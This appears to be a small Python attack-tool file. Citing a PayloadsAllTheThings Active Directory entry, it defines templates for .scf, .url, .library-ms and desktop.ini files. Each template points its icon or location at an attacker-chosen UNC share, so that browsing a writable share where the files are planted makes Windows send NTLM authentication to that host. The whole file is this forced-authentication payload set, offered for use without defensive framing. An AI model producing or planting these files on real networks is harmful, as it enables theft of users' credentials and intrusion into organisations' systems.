#!/usr/bin/env python3


# Reference: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#scf-and-url-file-attack-against-writeable-share

scf = """
[Shell]
Command=2
IconFile=\\\\{}\\share\\{}.ico
[Taskbar]
Command=ToggleDesktop
"""

url = """
[InternetShortcut]
URL=http://{}/x/{}.html
WorkingDirectory=whatever
IconIndex=1
IconFile=\\\\{}\\share\\{}.ico
"""

lib = """
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="<http://schemas.microsoft.com/windows/2009/library>">
  <name>@windows.storage.dll,-34582</name>
  <version>6</version>
  <isLibraryPinned>true</isLibraryPinned>
  <iconReference>imageres.dll,-1003</iconReference>
  <templateInfo>
    <folderType>[7d49d726-3c21-4f05-99aa-fdc2c9474656]></folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <isSupported>false</isSupported>
      <simpleLocation>
        <url>\\\\{}\\share\\{}</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
"""

ini = """
[.ShellClassInfo]
IconResource=\\\\{}\\share\\{}
IconIndex={}
"""
